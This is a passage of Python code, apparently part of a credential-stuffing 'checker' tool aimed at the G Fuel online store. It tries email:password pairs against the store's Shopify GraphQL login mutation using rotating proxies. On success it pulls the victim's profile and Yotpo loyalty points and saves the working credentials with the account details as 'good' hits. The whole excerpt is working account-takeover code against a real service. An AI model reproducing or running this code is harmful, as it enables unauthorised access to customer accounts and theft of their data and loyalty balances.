    ...
    while not Checker.stopping:
        try:
            ...
            with Session() as s:
                ...
                payload = (
                    'mutation {customerAccessTokenCreate(input:{email:"'
                    + email
                    + '",password:"'
                    + password
                ...
                r = s.post(
                    "https://gfuel.com/api/2021-07/graphql",
                    data=payload,
                    headers=header,
                )
                ...
                token = r.json()["data"]["customerAccessTokenCreate"][
                    "customerAccessToken"
                ]["accessToken"]
                ...
                payload = (
                    ...
                    + token
                    + '"){createdAt,displayName,email,id,firstName,lastName,phone}}'
                )
                r = s.post(
                    "https://gfuel.com/api/2021-07/graphql",
                    data=payload,
                ...
                id = str(
                    b64decode(r["data"]["customer"]["id"].encode()).decode()
                ).split("gid://shopify/Customer/")[-1]

                r = s.get(
                    f"https://loyalty.yotpo.com/api/v1/customer_details?customer_email={email}&customer_external_id={id}&customer_token={token}&merchant_id=33869"
                )
                ...
                if not points or int(points) <= 19:
                    if not Checker.cui:
                        log("custom", ":".join([email, password]), "Gfuel")
                    save(
                        "Gfuel",
                        "custom",
                        Checker.time,
                ...
                if not Checker.cui:
                    log("good", ":".join([email, password]), "Gfuel")
                save(
                    "Gfuel",
                    "good",
                    Checker.time,
                    ":".join([email, password])
                    + f" | Name: {name} | Subscribed: {subscribed} | Tier: {tier} | Points: {points}",
                )
                Checker.good += 1
                return_proxy(proxy)
                return
